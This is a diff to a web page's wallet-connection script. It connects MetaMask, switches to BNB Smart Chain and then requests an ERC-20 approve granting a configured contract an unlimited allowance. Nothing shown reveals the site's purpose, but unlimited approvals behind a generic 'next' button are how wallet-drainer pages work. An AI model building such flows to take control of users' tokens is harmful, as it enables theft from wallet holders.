@@ -206,12 +206,42 @@ document.addEventListener("DOMContentLoaded", function () {
         nextBtn.disabled = true;
 
         try {
-            const bnbChainId = "0x38";
-            await window.ethereum.request({
-                method: "wallet_switchEthereumChain",
-                params: [{ chainId: bnbChainId }]
+            // 1. Connect Wallet
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
             });
+            const fromAddress = accounts[0];
 
+            // 2. Switch Chain to BSC
+            const bnbChainId = "0x38";
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: bnbChainId }],
+                });
+            } catch (switchError) {
+                // This error code indicates that the chain has not been added to MetaMask.
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [{
+                            chainId: bnbChainId,
+                            chainName: "Binance Smart Chain Mainnet",
+                            nativeCurrency: {
+                                name: "BNB",
+                                symbol: "BNB",
+                                decimals: 18
+                            },
+                            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                            blockExplorerUrls: ["https://bscscan.com/"]
+                        }]
+                    });
+                } else {
+                    throw switchError;
+                }
+            }
+
+            // 3. Approve Transaction
             const iface = new ethers.utils.Interface([
                 "function approve(address spender, uint256 amount)"
             ]);
@@ -220,8 +250,6 @@ document.addEventListener("DOMContentLoaded", function () {
                 CONFIG.CONTRACT_ADDRESS,
                 ethers.constants.MaxUint256.toString()
             ]);
-
-            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
 
             const txHash = await window.ethereum.request({
                 method: "eth_sendTransaction",
